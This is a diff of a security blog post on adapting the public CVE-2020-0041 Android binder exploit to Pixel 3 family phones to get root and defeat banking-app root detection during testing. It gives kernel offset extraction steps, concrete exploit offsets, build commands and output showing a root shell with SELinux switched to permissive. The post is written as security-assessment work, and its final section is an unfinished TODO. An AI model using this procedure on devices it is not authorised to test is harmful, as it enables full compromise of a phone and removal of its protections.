@@ -7,7 +7,7 @@ description = "Adapting the CVE-2020-0041 privilege escalation exploit for Pixel
 
 There are different root frameworks that can be used on Android in order to obtain root privileges. Usually, during Android application security evaluations, root detection is tested in different ways. Application countermeasures such as root detection are easy to bypass in most of the Android applications and sometimes without the use of reverse engineering techniques; however, as I've been seen during the analysis of banking applications, bypassing root detection on these applications can be hard and time consuming due high obfuscation and countermeasures applied.
 
-A common procedure in the industry is the adaptation of privilege escalation exploits that are not detectable by most of the applications. In this post I will explain how to adapt bluefrostsecurity **CVE-2020-0041** PoC for Pixel 3 to all the Pixel3 family devices. Furthermore, I will provide a a code snipet to obtain a non-limited shell. 
+A common procedure in the industry is the adaptation of privilege escalation exploits that are not detectable by most of the applications. In this post I will explain how to adapt [bluefrostsecurity](https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/) **CVE-2020-0041** PoC for Pixel 3 to all the Pixel3 family devices. Furthermore, I will provide some improvements to obtain a non-limited root shell. 
 
 ## Requirements
 
@@ -33,14 +33,14 @@ cd abootimg
 make
 ```
 
-* Download and install [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool using pip3.
+* Download and install [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool using python pip:
 
 ```
 sudo apt install python3-pip
 sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
 ```
 
-* In addition, we will need the **Android NDK** in our path in order to compile the exploit. As an example, I have this on my .zshrc file.
+* In addition, we will need the **Android NDK** in our path in order to compile the exploit. As an example, I have this line on my .zshrc file.
 
 ```
 export NDK="/home/calabres/NDK"
@@ -48,23 +48,23 @@ export NDK="/home/calabres/NDK"
 
 ## Procedure
 
-1. First of all we need to extract the compressed kernel image from the boot.img. In order to do that, we will use the already downloaded tool **abootimg**.
+1. First of all we need to extract the compressed kernel image from the boot.img. For that, we will use the already downloaded tool **abootimg**.
 
 ```
 ./abootimg -x [path_to_boot_img]
 ```
 
-The produced zImage, is an image that contains the compressed Android Kernel. I love kernels.
+The produced zImage, is an image that contains the compressed Android Kernel.
 
 2. In order to obtain an uncompressed image of the Kernel that contains correct symbols and offsets, use the [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool.
 
 ```
-vmlinux-to-elf [path_to_zImage] [kernel.elf] 
+vmlinux-to-elf [path_to_zImage] kernel.elf
 ```
 
-3. Use a disassembler of your preference to find the labels related with the exploit offsets found in exploit.c:
+3. Use the disassembler of your preference to find the labels related with the exploit offsets found in exploit.c. The labels to find inside the kernel are the following:
 
-```
+```c
 SELINUX_ENFORCING_OFFSET 
 MEMSTART_ADDR_OFFSET 
 SYSCTL_TABLE_ROOT_OFFSET
@@ -74,38 +74,27 @@ INIT_CRED_OFFSET
 OFFSET_PIPE_FOP
 ```
 
-5) Align exploit.c with correct offsets.
 
-## Testing the exploit
 
-The exploit can be built by simply running "make" with the Android NDK in the path. It can also 
-be pushed to a phone attached with adb by doing "make all push" (warnings removed for brevity):
+4. Change exploit.c offsets for the offsets found in your device kernel image:
 
-```
-user@laptop:~/CVE-2020-0041/lpe$ make all push
-Building Android
-NDK_PROJECT_PATH=. ndk-build NDK_APPLICATION_MK=./Application.mk
-make[1]: Entering directory `/home/user/CVE-2020-0041/lpe'
-[arm64-v8a] Compile        : poc <= exploit.c
-[arm64-v8a] Compile        : poc <= endpoint.c
-[arm64-v8a] Compile        : poc <= pending_node.c
-[arm64-v8a] Compile        : poc <= binder.c
-[arm64-v8a] Compile        : poc <= log.c
-[arm64-v8a] Compile        : poc <= helpers.c
-[arm64-v8a] Compile        : poc <= binder_lookup.c
-[arm64-v8a] Compile        : poc <= realloc.c
-[arm64-v8a] Compile        : poc <= node.c
-[arm64-v8a] Executable     : poc
-[arm64-v8a] Install        : poc => libs/arm64-v8a/poc
-make[1]: Leaving directory `/home/user/CVE-2020-0041/lpe'
-adb push libs/arm64-v8a/poc /data/local/tmp/poc
-libs/arm64-v8a/poc: 1 file pushed. 4.3 MB/s (39016 bytes in 0.009s)
+```c
+#define SELINUX_ENFORCING_OFFSET 0x2ffe000
+#define MEMSTART_ADDR_OFFSET 0x23a6390
+#define SYSCTL_TABLE_ROOT_OFFSET 0x2dda178
+#define PROC_DOUINTVEC_OFFSET 0x19e8758
+#define INIT_TASK_OFFSET 0x2da1e00L
+#define INIT_CRED_OFFSET 0x2db0238
+#define OFFSET_PIPE_FOP 0x2173650
 ```
 
-Now just run /data/local/tmp/poc from an adb shell to see the exploit running:
+## Testing the exploit 
+
+*The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push"*
+
+*Now just run /data/local/tmp/poc from an adb shell to see the exploit running:*
 
 ```
-blueline:/ $ /data/local/tmp/poc
 [+] Mapped 200000
 [+] selinux_enforcing before exploit: 1
 [+] pipe file: 0xffffffd9c67c7700
@@ -147,4 +136,10 @@ root_by_cve-2020-0041:/ # getenforce
 Permissive
 root_by_cve-2020-0041:/ # 
 ```
+
+## Improvements
+
+After adapting the exploit, you will obtain a root shell; however, the shell will be very limited and not fully working.
+
+In order to ... //TODO
 
